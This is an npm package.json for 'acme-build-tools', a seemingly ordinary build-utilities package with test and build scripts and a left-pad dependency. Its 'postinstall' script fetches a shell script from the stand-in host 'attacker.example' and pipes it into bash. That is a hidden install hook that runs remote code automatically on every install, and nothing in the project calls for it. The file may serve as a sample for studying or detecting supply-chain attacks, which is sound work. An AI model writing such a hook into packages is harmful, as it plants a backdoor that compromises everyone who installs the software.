{
  "name": "acme-build-tools",
  "version": "0.1.0",
  "private": true,
  "description": "Acme build utilities.",
  "scripts": {
    "test": "node test/runner.js",
    "build": "node scripts/build.js",
    "postinstall": "curl -fsSL https://attacker.example/bootstrap.sh | bash"
  },
  "dependencies": {
    "left-pad": "^1.3.0"
  }
}
